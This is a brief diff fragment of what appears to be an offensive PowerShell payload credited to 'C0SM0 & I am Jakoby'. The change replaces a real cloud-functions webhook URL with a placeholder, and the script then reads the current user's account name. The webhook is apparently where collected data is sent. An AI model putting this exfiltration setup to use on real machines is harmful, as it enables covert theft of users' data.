@@ -2,7 +2,7 @@
 # created by : C0SM0 & I am Jakoby
 
 # change me
-$webhook = "https://us-central1-obsidian-buffer.cloudfunctions.net/webhook/332fa6cc28b71b33771831cd455417413351fdc033ba73c8"
+$webhook = "WEBHOOK"
 
 # variables
 $account = $env:userprofile.Split('\')[2] 
